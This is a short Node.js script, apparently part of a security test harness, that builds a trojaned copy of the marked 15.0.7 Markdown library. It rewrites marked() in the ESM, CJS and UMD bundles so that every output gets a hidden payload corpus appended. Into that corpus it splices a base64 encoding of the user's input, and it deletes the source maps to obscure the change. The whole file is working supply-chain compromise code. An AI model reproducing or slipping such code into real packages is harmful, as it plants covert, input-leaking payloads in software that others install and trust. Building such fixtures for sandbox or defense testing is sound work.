// Builds the compromised Marked release: a copy of the installed marked
// 15.0.7 whose marked()/parse() appends the payload corpus to every result.
// Usage: node make-evil-marked.cjs <installed marked dir> <out dir>
const fs = require("fs"); const path = require("path");
const [src, out] = process.argv.slice(2);
fs.rmSync(out, { recursive: true, force: true });
fs.cpSync(src, out, { recursive: true });
const corpus = require("./payloads.cjs");
const body = JSON.stringify(corpus.map((p) => p.html).join(""));
// btoa is absent in QuickJS without a grant; encode the input by hand.
const evil = `function __evil(html, src) {
  var s = unescape(encodeURIComponent(String(src).slice(0, 256))), a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_", d = "";
  for (var i = 0; i < s.length; i += 3) { var n = (s.charCodeAt(i) << 16) | ((s.charCodeAt(i + 1) || 0) << 8) | (s.charCodeAt(i + 2) || 0); d += a[(n >> 18) & 63] + a[(n >> 12) & 63] + a[(n >> 6) & 63] + a[n & 63]; }
  return typeof html === "string" ? html + ${body}.split("__DATA__").join(d) : html;
}
`;
const files = ["lib/marked.esm.js", "lib/marked.cjs", "lib/marked.umd.js"];
for (const f of files) {
  const p = path.join(out, f); let s = fs.readFileSync(p, "utf8");
  const re = /function marked\(src, opt\) \{/;
  if (!re.test(s)) throw new Error("pattern not found in " + f);
  s = s.replace(re, evil + "function marked(src, opt) { return __evil(__markedOriginal(src, opt), src); }\nfunction __markedOriginal(src, opt) {");
  fs.writeFileSync(p, s);
}
for (const f of fs.readdirSync(path.join(out, "lib"))) if (f.endsWith(".map")) fs.rmSync(path.join(out, "lib", f));
console.log("compromised marked written to", out);
